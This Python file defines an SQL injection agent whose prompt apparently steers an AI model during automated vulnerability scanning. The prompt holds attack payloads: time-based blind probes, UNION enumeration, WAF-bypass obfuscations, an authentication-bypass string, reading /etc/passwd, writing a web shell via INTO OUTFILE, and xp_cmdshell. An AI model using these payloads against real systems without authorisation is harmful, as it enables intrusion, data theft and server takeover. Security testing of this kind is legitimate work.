from core.base_agent import ReasoningAgent
from core.http_client import HTTPClient


class SQLiAgent(ReasoningAgent):
    VULN_TYPE = "SQLi"
    VULN_PROMPT = """
━━━ YOUR KNOWLEDGE BASE FOR SQL INJECTION ━━━

Use this to reason about what you observe — not as a sequence to follow.

WHAT SIGNALS TELL YOU ABOUT THE DATABASE:
  MySQL error keywords:      "You have an error in your SQL syntax", "mysql_fetch"
  PostgreSQL error keywords: "pg_query", "PSQLException", "unterminated quoted"
  MSSQL error keywords:      "Incorrect syntax near", "OLE DB", "Unclosed quotation"
  Oracle error keywords:     "ORA-", "quoted string not properly terminated"
  SQLite error keywords:     "SQLite3::query", "no such column"
  If no error shown:         The app may suppress errors — consider blind techniques

WHAT DIFFERENT RESPONSES TO ' vs '' TELL YOU:
  Different response → input is reaching a SQL query without parameterization
  Same response → may be parameterized, or errors suppressed, or input stripped

WHAT TELLS YOU THE INJECTION TYPE:
  Error message visible:    Error-based — extract data via error messages
  Response changes logic:   Boolean-based blind — AND 1=1 vs AND 1=2 differ
  Response time changes:    Time-based blind — SLEEP/WAITFOR observable
  Data appears in response: Union-based — find column count, then extract

WHAT YOU KNOW ABOUT EACH DB'S TIME FUNCTIONS:
  MySQL:      AND SLEEP(5)
  PostgreSQL: AND pg_sleep(5)
  MSSQL:      WAITFOR DELAY '0:0:5'
  Oracle:     AND 1=(SELECT 1 FROM DUAL WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1)
  SQLite:     AND randomblob(500000000/2)

WHAT TELLS YOU THE COLUMN COUNT (for UNION):
  ORDER BY 1, ORDER BY 2, ... until error → columns = last number before error
  Then: UNION SELECT NULL, NULL, NULL (match column count) → find which outputs data

WHAT BYPASSES WAF SQL FILTERING:
  Comments inside keywords:  UN/**/ION, SE/**/LECT
  Case variation:            uNiOn SeLeCt
  URL encoding:              %55NION (U encoded)
  Inline comments:           /*!50000 UNION*/ SELECT
  Equivalent expressions:    1=1 → 1 LIKE 1, 'a'='a'
  Whitespace variants:       tab, newline, carriage return instead of space
  String concatenation:      concat(0x61,0x64,0x6d,0x69,0x6e) for 'admin'

WHAT MAKES SQLI HIGH IMPACT:
  Authentication bypass:  ' OR '1'='1' --
  Data extraction:        UNION SELECT to read tables
  File read (MySQL):      LOAD_FILE('/etc/passwd') — needs FILE privilege
  File write (MySQL):     INTO OUTFILE '/var/www/shell.php' — if webroot writable
  Stored procedures:      xp_cmdshell on MSSQL (if enabled)

WHAT TELLS YOU IT IS SECOND-ORDER:
  Input is stored and used in a SQL query later — test by saving then triggering retrieval
  The injection point is not where the query runs

SEVERITY REASONING:
  Auth bypass, data extraction, RCE via SQLi → Critical
  Blind SQLi with table access → High
  Error disclosure only → Medium
"""

    def __init__(self, endpoint: dict, http: HTTPClient):
        super().__init__(endpoint, http)